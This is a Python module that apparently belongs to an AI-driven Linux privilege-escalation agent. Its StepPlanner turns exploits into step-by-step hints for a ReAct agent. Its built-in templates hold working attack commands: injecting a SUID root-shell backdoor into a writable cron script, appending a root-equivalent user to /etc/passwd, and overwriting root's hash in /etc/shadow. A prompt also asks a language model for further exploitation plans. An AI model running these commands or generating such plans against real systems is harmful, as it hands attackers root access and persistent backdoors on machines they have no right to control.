"""
StepPlanner: Multi-step exploitation decomposition (1 LLM call).

Activated only when CategoryMatcher identifies a multi-step exploit.
Decomposes the exploitation into verifiable sub-goals with fallback logic.
"""

from dataclasses import dataclass, field
from typing import List, Optional

from .category_matcher import ExploitCandidate


@dataclass
class ExploitStep:
    """A single step in a multi-step exploitation plan."""
    step_num: int
    description: str
    command: str
    expected_result: str
    fallback: str = ""
    verify_command: str = ""


@dataclass
class ExploitPlan:
    """Complete multi-step exploitation plan."""
    candidate: ExploitCandidate
    steps: List[ExploitStep] = field(default_factory=list)
    current_step: int = 0

    @property
    def is_complete(self) -> bool:
        return self.current_step >= len(self.steps)

    @property
    def current(self) -> Optional[ExploitStep]:
        if self.is_complete:
            return None
        return self.steps[self.current_step]

    def advance(self):
        self.current_step += 1

    def to_hint(self) -> str:
        """Convert current plan state to a hint string for the ReAct agent."""
        if self.is_complete:
            return ""
        step = self.current
        parts = [
            f"Step {step.step_num}/{len(self.steps)}: {step.description}",
            f"Suggested command: {step.command}",
        ]
        if step.expected_result:
            parts.append(f"Expected: {step.expected_result}")
        if step.verify_command:
            parts.append(f"Verify with: {step.verify_command}")
        return "\n".join(parts)


class StepPlanner:
    """
    Decomposes multi-step exploits into verifiable sub-goals.

    Has built-in templates for common multi-step patterns:
      - Cron job injection (write → wait → verify)
      - Password cracking (read shadow → crack → su)
      - Path hijacking (write → trigger → verify)
    """

    # Built-in plans for common patterns (no LLM needed)
    BUILTIN_PLANS = {
        "T1053.003_cron": [
            ExploitStep(1, "Identify writable cron script", "ls -la {binary}", "writable file"),
            ExploitStep(2, "Inject SUID backdoor into cron script",
                        'echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> {binary}',
                        "command succeeds"),
            ExploitStep(3, "Wait for cron execution", "sleep 65", ""),
            ExploitStep(4, "Execute SUID backdoor", "/tmp/rootbash -p", "root shell",
                        verify_command="id"),
        ],
        "T1078_passwd_write": [
            ExploitStep(1, "Generate password hash",
                        "openssl passwd -1 -salt hacker hacker123",
                        "password hash output"),
            ExploitStep(2, "Append root-equivalent user to /etc/passwd",
                        'echo "hacker:HASH:0:0::/root:/bin/bash" >> /etc/passwd',
                        "command succeeds"),
            ExploitStep(3, "Switch to new root user",
                        "su hacker",
                        "root shell",
                        verify_command="id"),
        ],
        "T1078_shadow_write": [
            ExploitStep(1, "Generate password hash",
                        "openssl passwd -1 -salt root newpass",
                        "password hash"),
            ExploitStep(2, "Replace root password hash in /etc/shadow",
                        "# Use sed or manual edit to replace root's hash",
                        "hash replaced"),
            ExploitStep(3, "Switch to root",
                        "su root",
                        "root shell",
                        verify_command="id"),
        ],
    }

    def plan_builtin(self, candidate: ExploitCandidate) -> Optional[ExploitPlan]:
        """
        Try to generate a plan from built-in templates.
        Returns None if no template matches.
        """
        template_steps = self.BUILTIN_PLANS.get(candidate.category)
        if template_steps is None:
            return None

        # Instantiate template with candidate specifics
        steps = []
        for tmpl in template_steps:
            step = ExploitStep(
                step_num=tmpl.step_num,
                description=tmpl.description.format(binary=candidate.binary),
                command=tmpl.command.format(binary=candidate.binary),
                expected_result=tmpl.expected_result,
                fallback=tmpl.fallback,
                verify_command=tmpl.verify_command,
            )
            steps.append(step)

        return ExploitPlan(candidate=candidate, steps=steps)

    def build_llm_prompt(self, candidate: ExploitCandidate) -> str:
        """
        Build LLM prompt for custom multi-step plan generation.
        Used when no built-in template matches.
        """
        return f"""You are a Linux privilege escalation expert. Decompose the following exploitation strategy into ordered, verifiable steps.

Category: {candidate.category}
Target: {candidate.binary}
Primary command: {candidate.exploit_cmd}
Notes: {candidate.notes}

For each step, provide:
1. description: what this step achieves
2. command: the shell command to execute
3. expected_result: how to verify this step succeeded
4. fallback: alternative if this step fails

Output a JSON array of step objects. Keep the plan minimal (2-5 steps).
Output ONLY the JSON array, no other text."""

    @staticmethod
    def parse_llm_plan(candidate: ExploitCandidate, llm_output: str) -> ExploitPlan:
        """Parse LLM-generated plan into ExploitPlan."""
        import json

        steps = []
        try:
            # Try direct JSON parse
            data = json.loads(llm_output.strip())
            if not isinstance(data, list):
                data = [data]
        except json.JSONDecodeError:
            # Try extracting JSON from markdown code blocks
            import re
            match = re.search(r'\[.*\]', llm_output, re.DOTALL)
            if match:
                try:
                    data = json.loads(match.group())
                except json.JSONDecodeError:
                    data = []
            else:
                data = []

        for i, item in enumerate(data):
            if not isinstance(item, dict):
                continue
            steps.append(ExploitStep(
                step_num=i + 1,
                description=item.get("description", f"Step {i+1}"),
                command=item.get("command", ""),
                expected_result=item.get("expected_result", ""),
                fallback=item.get("fallback", ""),
                verify_command=item.get("verify_command", ""),
            ))

        return ExploitPlan(candidate=candidate, steps=steps)
